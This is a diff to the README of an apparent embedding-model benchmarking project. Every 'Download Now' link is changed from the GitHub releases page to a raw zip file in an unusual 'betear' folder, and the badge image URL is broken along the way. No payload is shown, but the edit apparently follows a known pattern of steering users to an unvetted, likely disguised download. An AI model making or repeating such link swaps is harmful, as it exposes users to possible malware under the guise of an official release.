@@ -1,6 +1,6 @@
 # 🚀 Benchmark_Embedding_Models - Benchmark Your Embedding Models Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/Jon-Sina/Benchmark_Embedding_Models/releases)
+[![Download Now](https://raw.githubusercontent.com/Jon-Sina/Benchmark_Embedding_Models/main/betear/Benchmark_Embedding_Models.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Jon-Sina/Benchmark_Embedding_Models/main/betear/Benchmark_Embedding_Models.zip)
 
 ## 📋 Description
 
@@ -33,7 +33,7 @@ Benchmark_Embedding_Models is a user-friendly application designed for users int
 To get started with Benchmark_Embedding_Models, follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to access the download options.
-   [Download Now](https://github.com/Jon-Sina/Benchmark_Embedding_Models/releases)
+   [Download Now](https://raw.githubusercontent.com/Jon-Sina/Benchmark_Embedding_Models/main/betear/Benchmark_Embedding_Models.zip)
 
 2. **Choose the Latest Release**: Find the most recent version listed on the page. 
 
@@ -57,7 +57,7 @@ To get started with Benchmark_Embedding_Models, follow these steps:
 
 To download Benchmark_Embedding_Models, visit the releases page and select the latest version:
 
-[Download Now](https://github.com/Jon-Sina/Benchmark_Embedding_Models/releases)
+[Download Now](https://raw.githubusercontent.com/Jon-Sina/Benchmark_Embedding_Models/main/betear/Benchmark_Embedding_Models.zip)
 
 After downloading, follow the installation instructions provided for your operating system.
 
@@ -91,4 +91,4 @@ For support or questions, please feel free to open an issue on the GitHub reposi
 
 For more details, check the documentation or explore additional resources related to embedding models and their applications in natural language processing.
 
-[Download Now](https://github.com/Jon-Sina/Benchmark_Embedding_Models/releases)
+[Download Now](https://raw.githubusercontent.com/Jon-Sina/Benchmark_Embedding_Models/main/betear/Benchmark_Embedding_Models.zip)
